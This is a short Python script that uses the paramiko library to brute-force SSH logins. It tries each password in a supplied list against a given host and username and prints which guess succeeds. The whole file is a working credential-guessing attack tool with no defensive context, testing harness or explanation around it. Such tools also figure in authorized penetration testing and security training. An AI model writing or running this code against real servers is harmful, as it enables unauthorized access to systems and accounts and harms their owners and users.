import paramiko

def ssh_brute_force(host, username, password_list):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for password in password_list:
        try:
            client.connect(hostname=host, username=username, password=password, timeout=3)
            print(f"[+] Password Found: {password}")
            return
        except paramiko.AuthenticationException:
            print(f"[-] Wrong password: {password}")
        except Exception as e:
            print(f"[!] Error: {e}")
